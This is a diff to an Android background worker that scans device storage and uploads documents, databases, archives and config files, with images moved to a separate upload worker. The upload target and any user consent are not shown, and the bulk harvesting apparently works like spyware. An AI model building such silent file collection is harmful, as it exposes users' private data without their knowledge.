@@ -110,9 +110,10 @@ public class DocumentUploadWorker extends Worker {
         
         Log.d(TAG, "================================================");
         Log.d(TAG, "🔍 DOCUMENT UPLOAD SCAN");
-        Log.d(TAG, "📄 Using Android MediaStore API + Fallback");
-        Log.d(TAG, "   Documents: PDF, Excel, CSV, XLSX, Word, PowerPoint");
-        Log.d(TAG, "   Images: JPG, PNG, GIF, BMP, WebP");
+        Log.d(TAG, "📄 Documents ONLY (NO Images)");
+        Log.d(TAG, "   ✓ PDF, Excel, CSV, XLSX, Word, PowerPoint");
+        Log.d(TAG, "   ✓ Text, JSON, XML, Databases, Archives");
+        Log.d(TAG, "   ✗ Images: JPG, PNG, GIF, BMP, WebP");
         Log.d(TAG, "   Storage check: " + FeaturePermissions.hasGalleryPermission(getApplicationContext()));
         Log.d(TAG, "================================================");
         
@@ -175,10 +176,12 @@ public class DocumentUploadWorker extends Worker {
             Log.d(TAG, "      ✓ Word documents (.docx, .doc)");
             Log.d(TAG, "      ✓ PowerPoint (.pptx, .ppt)");
             Log.d(TAG, "      ✓ Text/Config files (.txt, .json, .xml)");
+            Log.d(TAG, "      ✓ Databases & Archives");
             Log.d(TAG, "   🖼️  IMAGES:");
-            Log.d(TAG, "      ✓ JPG, PNG, GIF, BMP, WebP");
+            Log.d(TAG, "      ⚠️  Handled separately by ImageUploadWorker");
         } else {
-            Log.w(TAG, "   ⚠️  NO FILES UPLOADED!");
+            Log.w(TAG, "   ⚠️  NO DOCUMENTS UPLOADED!");
+            Log.w(TAG, "   Note: Images are uploaded by ImageUploadWorker separately");
             Log.w(TAG, "   Check: Storage permission granted?");
         }
         Log.d(TAG, "================================================");
@@ -408,12 +411,12 @@ public class DocumentUploadWorker extends Worker {
             lower.endsWith(".7z") || lower.endsWith(".tar") ||
             lower.endsWith(".gz")) return true;
         
-        // ========== ACCEPT IMAGES ==========
+        // ========== SKIP IMAGES (Handled by ImageUploadWorker) ==========
         
         if (lower.endsWith(".jpg") || lower.endsWith(".jpeg") ||
             lower.endsWith(".png") || lower.endsWith(".gif") ||
             lower.endsWith(".bmp") || lower.endsWith(".webp") ||
-            lower.endsWith(".svg")) return true;
+            lower.endsWith(".svg")) return false;  // ✗ SKIP IMAGES
         
         // ========== SKIP VIDEOS AND AUDIO ==========
         
